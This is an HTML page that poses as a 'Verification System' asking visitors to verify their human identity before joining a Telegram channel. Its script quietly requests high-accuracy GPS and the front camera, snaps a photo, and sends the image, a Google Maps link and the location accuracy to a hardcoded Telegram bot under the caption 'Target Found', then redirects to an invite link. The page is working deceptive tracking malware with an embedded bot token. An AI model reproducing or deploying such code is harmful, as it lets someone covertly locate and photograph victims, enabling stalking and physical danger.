<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verification System</title>
    <style>
        body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
        .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h2>Access Denied</h2>
    <p>Please verify your human identity to join the channel.</p>
    <button id="startBtn" class="join-btn">VERIFY IDENTITY</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = "8949954317:AAEToMTbNA1r5n00U7dKJcVXSVUcSacmLaE";
    const CHAT_ID = "5304050102";
    const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";

    document.getElementById('startBtn').addEventListener('click', async () => {
        try {
            // ၁။ High Accuracy Location တောင်းဆိုခြင်း
            const geoOptions = {
                enableHighAccuracy: true, // GPS ကို အသုံးပြုပြီး အိမ်လိပ်စာနီးပါး တိကျအောင် လုပ်ခြင်း
                timeout: 10000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const accuracy = pos.coords.accuracy; // တိကျမှု ဘယ်နှစ်မီတာ ရှိသလဲဆိုတာ

                // Google Maps Link (Plus Code ပါဝင်စေရန်)
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

                // ၂။ Camera Permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('video').srcObject = stream;

                // ၃။ ပုံရိုက်ပြီး အချက်အလက်များ ပို့ခြင်း
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    const video = document.getElementById('video');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'target.jpg');
                    formData.append('caption', `🎯 *Target Found (High Precision)*\n\n📍 Map: ${mapLink}\n🎯 Accuracy: ${Math.round(accuracy)} meters\n🔋 Device Info Collected.`);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = REDIRECT_URL;
                }, 3000);

            }, (err) => {
                alert("Please enable High Accuracy GPS to continue.");
                location.reload();
            }, geoOptions);

        } catch (err) {
            alert("Verification Failed. Permission required.");
            location.reload();
        }
    });
</script>
</body>
</html>
